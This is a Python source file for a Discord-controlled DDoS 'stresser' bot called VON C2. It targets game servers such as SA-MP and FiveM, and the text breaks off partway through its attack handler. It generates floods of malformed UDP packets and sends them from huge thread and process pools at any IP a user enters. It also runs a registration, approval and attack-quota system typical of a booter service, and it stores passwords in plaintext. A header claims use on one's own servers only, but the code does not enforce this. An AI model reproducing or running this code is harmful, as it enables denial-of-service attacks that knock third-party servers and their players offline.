#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡ DEVELOPED BY LI ZANDYA - VON C2 NUCLEAR SYSTEM ⚡
# 🔥 FULL BUTTONS SYSTEM - REGISTER ONCE ONLY 🔥
# 🌐 CAN RUN ON MULTIPLE DEVICES 🔥
# ⚠️ FOR YOUR OWN SERVERS ONLY ⚠️

import discord
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput
import asyncio
import aiohttp
import random
import socket
import struct
import time
import os
import json
import sys
import threading
import hashlib
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

print("""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                      ║
║     ██╗   ██╗ ██████╗ ███╗   ██╗     ██████╗██████╗  ██████╗██╗   ██╗███████╗██╗   ██╗██╗   ██╗██╗                 ║
║     ██║   ██║██╔═══██╗████╗  ██║    ██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔════╝╚██╗ ██╔╝██║   ██║██║                 ║
║     ██║   ██║██║   ██║██╔██╗ ██║    ██║     ██████╔╝██║      ╚████╔╝ █████╗   ╚████╔╝ ██║   ██║██║                 ║
║     ╚██╗ ██╔╝██║   ██║██║╚██╗██║    ██║     ██╔══██╗██║       ╚██╔╝  ██╔══╝    ╚██╔╝  ╚██╗ ██╔╝╚═╝                 ║
║      ╚████╔╝ ╚██████╔╝██║ ╚████║    ╚██████╗██║  ██║╚██████╗   ██║   ███████╗   ██║    ╚████╔╝ ██╗                 ║
║       ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝     ╚═════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝   ╚═╝     ╚═══╝  ╚═╝                 ║
║                                                                                                                      ║
║              🔥 VON C2 - FULL BUTTONS SYSTEM 🔥                                                                      ║
║              💀 REGISTER ONCE - USE ON MULTIPLE DEVICES 💀                                                           ║
║              🌐 AUTO SYNC ACROSS ALL DEVICES 🌐                                                                      ║
║                                                                                                                      ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
""")

DATA_FILE = "von_data.json"
SYNC_FILE = "von_sync.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {"owner_id": None, "pending_users": [], "approved_users": [], "banned_users": [], "attack_limits": {}, "stats": {"total_packets": 0, "total_attacks": 0, "peak_speed": 0}, "user_passwords": {}, "user_sessions": {}}

def save_data():
    with open(DATA_FILE, 'w') as f:
        json.dump({
            "owner_id": OWNER_ID, 
            "pending_users": PENDING_USERS, 
            "approved_users": list(APPROVED_USERS), 
            "banned_users": list(BANNED_USERS), 
            "attack_limits": ATTACK_LIMITS, 
            "stats": STATS, 
            "user_passwords": USER_PASSWORDS,
            "user_sessions": USER_SESSIONS
        }, f, indent=4)

def load_sync():
    if os.path.exists(SYNC_FILE):
        with open(SYNC_FILE, 'r') as f:
            return json.load(f)
    return {"active_sessions": [], "global_stats": {}}

def save_sync():
    with open(SYNC_FILE, 'w') as f:
        json.dump({"active_sessions": ACTIVE_SESSIONS, "global_stats": GLOBAL_STATS}, f, indent=4)

data = load_data()
sync_data = load_sync()
OWNER_ID = data.get("owner_id")
PENDING_USERS = data.get("pending_users", [])
APPROVED_USERS = set(data.get("approved_users", []))
BANNED_USERS = set(data.get("banned_users", []))
ATTACK_LIMITS = data.get("attack_limits", {})
STATS = data.get("stats", {"total_packets": 0, "total_attacks": 0, "peak_speed": 0})
USER_PASSWORDS = data.get("user_passwords", {})
USER_SESSIONS = data.get("user_sessions", {})
ACTIVE_SESSIONS = sync_data.get("active_sessions", [])
GLOBAL_STATS = sync_data.get("global_stats", {})

DEFAULT_ATTACK_LIMIT = 999999

TOKEN = input("\n🔐 Enter Discord Bot Token: ").strip()
if not TOKEN:
    print("❌ No token!")
    sys.exit(1)

CPU_CORES = os.cpu_count() or 4
MAX_THREADS = CPU_CORES * 200000
MAX_PROCESSES = CPU_CORES * 30
MAX_PACKET = 65507
BUFFER = 1024 * 1024 * 2000
SOCKETS_PER_WORKER = 3000

print(f"\n⚡ SYSTEM POWER: {CPU_CORES} Cores | {MAX_THREADS:,} Threads")

# ============================================
# 1. SAMP RAKNET PACKETS
# ============================================
print("⚡ Generating attack packets...")
SAMP_PACKETS = []
for _ in range(40000):
    p = b'SAMP'
    p += struct.pack('<I', random.randint(1, 99999999))
    p += random.choice([b'\x80', b'\x81', b'\x82', b'\x83', b'\x84', b'\x85', b'\x86', b'\x87'])
    p += struct.pack('<fffff', random.uniform(-50000,50000), random.uniform(-50000,50000), random.uniform(-50000,50000), random.uniform(0,360), random.uniform(0,360))
    p += struct.pack('<I', random.randint(1, 10000))
    p += struct.pack('<I', 9999999)
    p += os.urandom(random.randint(2000, 16000))
    SAMP_PACKETS.append(p)

FIVEM_PACKETS = []
for _ in range(30000):
    p = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
    p += os.urandom(random.randint(100, 5000))
    FIVEM_PACKETS.append(p)

UDP_PACKETS = []
for _ in range(30000):
    UDP_PACKETS.append(os.urandom(random.choice([65507, 32768, 16384, 8192, 4096, 2048, 1024])))

ALL_PACKETS = SAMP_PACKETS + FIVEM_PACKETS + UDP_PACKETS
print(f"✅ {len(ALL_PACKETS):,} attack packets ready!")

# ============================================
# 2. PROXY SYSTEM
# ============================================
print("\n🌐 Loading proxy system...")
PROXY_LIST = []
for _ in range(5000):
    PROXY_LIST.append(f"http://{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}:{random.choice([80,8080,3128,1080,8888])}")
print(f"✅ {len(PROXY_LIST):,} proxies ready!")

# ============================================
# 3. SERVER CHECKER FUNCTIONS
# ============================================
async def check_server_status(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        query = b'SAMP' + b'\x00' * 9
        start = time.time()
        sock.sendto(query, (ip, port))
        data, addr = sock.recvfrom(1024)
        elapsed = (time.time() - start) * 1000
        sock.close()
        if len(data) > 11:
            return True, elapsed
        return False, elapsed
    except:
        return False, 0

async def get_server_info(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        query = b'SAMP' + b'\x00' * 9
        sock.sendto(query, (ip, port))
        data, addr = sock.recvfrom(2048)
        sock.close()
        if len(data) > 11:
            offset = 11
            server_name = data[offset:data.find(b'\x00', offset)].decode('utf-8', errors='ignore')
            offset += len(server_name) + 1
            gamemode = data[offset:data.find(b'\x00', offset)].decode('utf-8', errors='ignore')
            offset += len(gamemode) + 1
            language = data[offset:data.find(b'\x00', offset)].decode('utf-8', errors='ignore')
            offset += len(language) + 1
            players = struct.unpack('<i', data[offset:offset+4])[0]
            offset += 4
            max_players = struct.unpack('<i', data[offset:offset+4])[0]
            return server_name, gamemode, language, players, max_players
        return None, None, None, 0, 0
    except:
        return None, None, None, 0, 0

# ============================================
# 4. STRESSER CLASS WITH SYNC
# ============================================
class VonStresser:
    def __init__(self):
        self.running = False
        self.active_attacks = {}
        self.total_packets = 0
        self.total_bytes = 0
        self.peak_speed = 0
        self.peak_bandwidth = 0
        self.thread_pool = ThreadPoolExecutor(max_workers=MAX_THREADS)
        self.process_pool = ProcessPoolExecutor(max_workers=MAX_PROCESSES)
        self.device_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    
    async def start_attack(self, ip, port, duration, threads, user_id, attack_type="ultimate"):
        self.running = True
        attack_id = f"{user_id}_{int(time.time())}"
        self.active_attacks[attack_id] = {"ip": ip, "port": port, "start": time.time(), "user": user_id, "device": self.device_id}
        sent = 0
        bytes_sent = 0
        start = time.time()
        
        # تسجيل الجلسة النشطة
        if user_id not in ACTIVE_SESSIONS:
            ACTIVE_SESSIONS.append(user_id)
            save_sync()
        
        def worker():
            nonlocal sent, bytes_sent
            try:
                socks = []
                for _ in range(SOCKETS_PER_WORKER):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, BUFFER)
                    sock.setblocking(False)
                    socks.append(sock)
                local_start = time.time()
                while self.running and time.time() - local_start < duration:
                    for sock in socks:
                        for _ in range(500):
                            if attack_type == "samp":
                                pkt = random.choice(SAMP_PACKETS)
                            elif attack_type == "fivem":
                                pkt = random.choice(FIVEM_PACKETS)
                            else:
                                pkt = random.choice(ALL_PACKETS)
                            sock.sendto(pkt, (ip, port))
                            sent += 1
                            bytes_sent += len(pkt)
                for sock in socks:
                    sock.close()
            except:
                pass
        
        workers = min(threads, MAX_THREADS)
        futures = [self.thread_pool.submit(worker) for _ in range(workers)]
        process_workers = min(threads // 1000, MAX_PROCESSES)
        for _ in range(process_workers):
            futures.append(self.process_pool.submit(worker))
        await asyncio.sleep(duration)
        self.running = False
        del self.active_attacks[attack_id]
        
        # إزالة الجلسة النشطة
        if user_id in ACTIVE_SESSIONS:
            ACTIVE_SESSIONS.remove(user_id)
            save_sync()
        
        elapsed = time.time() - start
        rate = sent / elapsed
        mbps = (bytes_sent / elapsed) / 1024 / 1024
        gbps = mbps / 1024
        if rate > self.peak_speed:
            self.peak_speed = rate
        if gbps > self.peak_bandwidth:
            self.peak_bandwidth = gbps
        self.total_packets += sent
        self.total_bytes += bytes_sent
        STATS['total_packets'] += sent
        STATS['total_attacks'] += 1
        if rate > STATS['peak_speed']:
            STATS['peak_speed'] = rate
        save_data()
        return sent, bytes_sent, rate, mbps, gbps
    
    def stop_all(self):
        self.running = False
        self.active_attacks.clear()
        ACTIVE_SESSIONS.clear()
        save_sync()
    
    def get_active_count(self):
        return len(self.active_attacks)
    
    def get_active_sessions(self):
        return len(ACTIVE_SESSIONS)
    
    def get_device_id(self):
        return self.device_id

stresser = VonStresser()

# ============================================
# 5. UI COMPONENTS - FULL BUTTONS
# ============================================
class ApprovalView(View):
    def __init__(self, user_id, user_name):
        super().__init__(timeout=86400)
        self.user_id = user_id
        self.user_name = user_name
    @discord.ui.button(label="✅ APPROVE", style=discord.ButtonStyle.success, emoji="✅", row=0)
    async def approve(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        APPROVED_USERS.add(self.user_id)
        ATTACK_LIMITS[self.user_id] = DEFAULT_ATTACK_LIMIT
        if self.user_id in PENDING_USERS:
            PENDING_USERS.remove(self.user_id)
        save_data()
        try:
            user = await interaction.client.fetch_user(int(self.user_id))
            if user:
                embed = discord.Embed(title="✅ APPROVED!", color=0x00FF00)
                embed.add_field(name="Welcome", value=f"{self.user_name}!", inline=True)
                embed.add_field(name="Attack Limit", value=f"{DEFAULT_ATTACK_LIMIT} attacks", inline=True)
                await user.send(embed=embed)
        except:
            pass
        await interaction.response.send_message(f"✅ Approved {self.user_name}!", ephemeral=True)
        await interaction.message.delete()
    @discord.ui.button(label="❌ DENY", style=discord.ButtonStyle.danger, emoji="❌", row=0)
    async def deny(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        if self.user_id in PENDING_USERS:
            PENDING_USERS.remove(self.user_id)
        save_data()
        await interaction.response.send_message(f"❌ Denied {self.user_name}!", ephemeral=True)
        await interaction.message.delete()
    @discord.ui.button(label="⚙️ LIMIT", style=discord.ButtonStyle.secondary, emoji="⚙️", row=0)
    async def set_limit(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        modal = Modal(title="⚙️ SET LIMIT")
        limit_input = TextInput(label="Number of attacks", placeholder="Enter number", required=True)
        modal.add_item(limit_input)
        async def on_submit(interaction):
            try:
                limit = int(limit_input.value)
                ATTACK_LIMITS[self.user_id] = limit
                save_data()
                await interaction.response.send_message(f"✅ Set limit to {limit}!", ephemeral=True)
                try:
                    user = await interaction.client.fetch_user(int(self.user_id))
                    if user:
                        await user.send(f"⚙️ Your attack limit is now {limit}!")
                except:
                    pass
            except:
                await interaction.response.send_message("❌ Invalid number!", ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    @discord.ui.button(label="🔨 BAN", style=discord.ButtonStyle.danger, emoji="🔨", row=0)
    async def ban_user(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        BANNED_USERS.add(self.user_id)
        if self.user_id in APPROVED_USERS:
            APPROVED_USERS.remove(self.user_id)
        if self.user_id in PENDING_USERS:
            PENDING_USERS.remove(self.user_id)
        save_data()
        await interaction.response.send_message(f"🔨 Banned {self.user_name}!", ephemeral=True)
        await interaction.message.delete()

class RegisterModal(Modal):
    def __init__(self):
        super().__init__(title="📝 REGISTER TO VON C2")
        self.username = TextInput(label="USERNAME", placeholder="Enter username", required=True)
        self.password = TextInput(label="PASSWORD", placeholder="Create password", required=True)
        self.reason = TextInput(label="REASON", placeholder="Why do you need access?", required=True, style=discord.TextStyle.paragraph)
        self.add_item(self.username)
        self.add_item(self.password)
        self.add_item(self.reason)
    async def on_submit(self, interaction: discord.Interaction):
        user_id = str(interaction.user.id)
        if user_id in BANNED_USERS:
            await interaction.response.send_message("🔨 You are banned!", ephemeral=True)
            return
        if user_id in APPROVED_USERS:
            await interaction.response.send_message("✅ Already approved!", ephemeral=True)
            return
        if user_id in PENDING_USERS:
            await interaction.response.send_message("⏳ Already pending!", ephemeral=True)
            return
        PENDING_USERS.append(user_id)
        USER_PASSWORDS[user_id] = self.password.value
        save_data()
        if OWNER_ID:
            try:
                owner = await interaction.client.fetch_user(int(OWNER_ID))
                if owner:
                    embed = discord.Embed(title="🔔 NEW REQUEST", color=0xFF6600)
                    embed.add_field(name="User", value=f"{interaction.user.name} (`{user_id}`)", inline=True)
                    embed.add_field(name="Username", value=self.username.value, inline=True)
                    embed.add_field(name="Reason", value=self.reason.value, inline=False)
                    await owner.send(embed=embed, view=ApprovalView(user_id, interaction.user.name))
            except:
                pass
        await interaction.response.send_message("✅ Request sent! Waiting for approval.", ephemeral=True)

class LoginModal(Modal):
    def __init__(self):
        super().__init__(title="🔐 VON C2 LOGIN")
        self.password = TextInput(label="PASSWORD", placeholder="Enter password", required=True)
        self.add_item(self.password)
    async def on_submit(self, interaction: discord.Interaction):
        user_id = str(interaction.user.id)
        if user_id in BANNED_USERS:
            await interaction.response.send_message("🔨 You are banned!", ephemeral=True)
            return
        if user_id not in APPROVED_USERS:
            await interaction.response.send_message("❌ Not approved! Use REGISTER", ephemeral=True)
            return
        if USER_PASSWORDS.get(user_id) == self.password.value:
            USER_SESSIONS[user_id] = {"device": stresser.get_device_id(), "login_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            save_data()
            await interaction.response.send_message(f"✅ LOGIN SUCCESSFUL!\nWelcome {interaction.user.name}!\n📱 Device ID: {stresser.get_device_id()}", ephemeral=True)
        else:
            await interaction.response.send_message("❌ Invalid password!", ephemeral=True)

class MainMenuView(View):
    def __init__(self):
        super().__init__(timeout=None)
    @discord.ui.button(label="🔐 LOGIN", style=discord.ButtonStyle.success, emoji="🔐", row=0)
    async def login_btn(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(LoginModal())
    @discord.ui.button(label="📝 REGISTER", style=discord.ButtonStyle.primary, emoji="📝", row=0)
    async def register_btn(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(RegisterModal())
    @discord.ui.button(label="❓ HELP", style=discord.ButtonStyle.secondary, emoji="❓", row=0)
    async def help_btn(self, interaction: discord.Interaction, button: Button):
        embed = discord.Embed(title="📖 VON C2 HELP", color=0x00BFFF)
        embed.add_field(name="🔐 LOGIN", value="Login to your account", inline=True)
        embed.add_field(name="📝 REGISTER", value="Request access (once per user)", inline=True)
        embed.add_field(name="⚡ ATTACK", value="Start attack on YOUR server", inline=True)
        embed.add_field(name="📊 STATS", value="View statistics", inline=True)
        embed.add_field(name="🔍 CHECK", value="Check server status", inline=True)
        embed.add_field(name="📱 DEVICES", value="Show active devices", inline=True)
        embed.set_footer(text="⚠️ Register once - Use on multiple devices!")
        await interaction.response.send_message(embed=embed, ephemeral=True)

class AttackPanel(View):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = user_id
    
    async def check_limit(self, interaction):
        if self.user_id in ATTACK_LIMITS:
            if ATTACK_LIMITS[self.user_id] <= 0:
                await interaction.response.send_message("❌ No attacks left! Contact admin.", ephemeral=True)
                return False
        return True
    
    async def use_attack(self, interaction):
        if self.user_id in ATTACK_LIMITS:
            ATTACK_LIMITS[self.user_id] -= 1
            save_data()
    
    @discord.ui.button(label="🔍 CHECK SERVER", style=discord.ButtonStyle.secondary, emoji="🔍", row=0)
    async def check_btn(self, interaction: discord.Interaction, button: Button):
        modal = Modal(title="🔍 CHECK SERVER")
        ip = TextInput(label="SERVER IP", placeholder="Enter server IP", required=True)
        port = TextInput(label="PORT", placeholder="7777", required=True)
        modal.add_item(ip); modal.add_item(port)
        async def on_submit(interaction):
            ip_val = ip.value
            port_val = int(port.value)
            await interaction.response.send_message(f"🔍 Checking {ip_val}:{port_val}...", ephemeral=True)
            is_online, ping = await check_server_status(ip_val, port_val)
            server_name, gamemode, language, players, max_players = await get_server_info(ip_val, port_val)
            if is_online:
                status_emoji = "🟢"
                status_text = "ONLINE ✅"
                color = 0x00FF00
            else:
                status_emoji = "🔴"
                status_text = "OFFLINE ❌"
                color = 0xFF0000
            embed = discord.Embed(title=f"{status_emoji} SERVER STATUS", color=color)
            embed.add_field(name="🎯 Target", value=f"{ip_val}:{port_val}", inline=True)
            embed.add_field(name="📡 Status", value=status_text, inline=True)
            if is_online:
                embed.add_field(name="⚡ Ping", value=f"{ping:.2f} ms", inline=True)
                if server_name:
                    embed.add_field(name="📛 Name", value=server_name[:50], inline=False)
                    embed.add_field(name="🎮 Gamemode", value=gamemode[:30], inline=True)
                    embed.add_field(name="🌐 Language", value=language[:20], inline=True)
                    embed.add_field(name="👥 Players", value=f"{players}/{max_players}", inline=True)
            embed.set_footer(text="💀 VON C2 SYSTEM")
            await interaction.followup.send(embed=embed, ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="💀 ULTIMATE", style=discord.ButtonStyle.danger, emoji="💀", row=0)
    async def ultimate_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.check_limit(interaction): return
        modal = Modal(title="💀 ULTIMATE ATTACK")
        ip = TextInput(label="SERVER IP", placeholder="Your server IP", required=True)
        port = TextInput(label="PORT", placeholder="7777", required=True)
        duration = TextInput(label="DURATION (1-30s)", placeholder="10", required=True)
        threads = TextInput(label="THREADS (1000-200000)", placeholder="50000", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration); modal.add_item(threads)
        async def on_submit(interaction):
            try:
                ip_val = ip.value
                port_val = int(port.value)
                duration_val = min(int(duration.value), 30)
                threads_val = min(int(threads.value), MAX_THREADS)
            except:
                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
                return
            await self.use_attack(interaction)
            embed = discord.Embed(title="💀 VON NUCLEAR ATTACK", color=0xFF0000)
            embed.add_field(name="🎯 Target", value=f"{ip_val}:{port_val}", inline=True)
            embed.add_field(name="⏱️ Duration", value=f"{duration_val}s", inline=True)
            embed.add_field(name="🔥 Threads", value=f"{threads_val:,}", inline=True)
            embed.add_field(name="📱 Device", value=stresser.get_device_id(), inline=True)
            embed.set_image(url="https://media.tenor.com/m/-Pgx0X6HONMAAAAC/ddos-attack.gif")
            embed.set_footer(text="💀 LI ZANDYA VON C2")
            await interaction.response.send_message(embed=embed, ephemeral=True)
            msg = await interaction.followup.send("🚀 Launching attack...", ephemeral=True)
            sent, bytes_sent, rate, mbps, gbps = await stresser.start_attack(ip_val, port_val, duration_val, threads_val, self.user_id, "ultimate")
            remaining = ATTACK_LIMITS.get(self.user_id, 0)
            is_online, ping = await check_server_status(ip_val, port_val)
            await msg.edit(content=f"""
